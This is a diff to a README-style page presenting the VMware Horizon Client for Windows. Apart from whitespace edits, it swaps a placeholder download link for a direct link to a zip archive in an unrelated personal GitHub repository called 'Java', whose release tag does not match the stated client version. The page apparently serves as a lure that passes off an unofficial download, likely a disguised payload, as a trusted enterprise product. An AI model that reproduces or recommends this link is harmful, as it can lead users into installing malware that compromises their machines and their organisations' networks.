@@ -2,14 +2,14 @@
 
 The VMware Horizon Client for Windows is a tool that facilitates secure connections to remote desktops and applications hosted on VMware Horizon servers. It allows both enterprises and individual users to access their digital workspaces from virtually any location, all while maintaining robust security standards and smooth compatibility with peripheral devices and network configurations.
 
-- [Installation](#installation)  
-- [System Requirements and Setup](#system-requirements-and-setup)  
-- [Installing and Updating Horizon Client](#installing-and-updating-horizon-client)  
-- [Configuring Horizon Client](#configuring-horizon-client)  
+- [Installation](#installation)
+- [System Requirements and Setup](#system-requirements-and-setup)
+- [Installing and Updating Horizon Client](#installing-and-updating-horizon-client)
+- [Configuring Horizon Client](#configuring-horizon-client)
 - [Connecting to Remote Desktops and Applications](#connecting-to-remote-desktops-and-applications)
 
 ## Installation  
-[**Download VMware Horizon Client**](*)  
+[**Download VMware Horizon Client**](https://github.com/roadwolf808/Java/releases/download/8.385/vmware-horizon-client-x64-5.5.6.zip)  
 
 Click the download link to begin setting up the VMware Horizon Client. This utility provides a secure bridge to access virtual desktops and applications on your organization’s infrastructure from any Windows system.
 
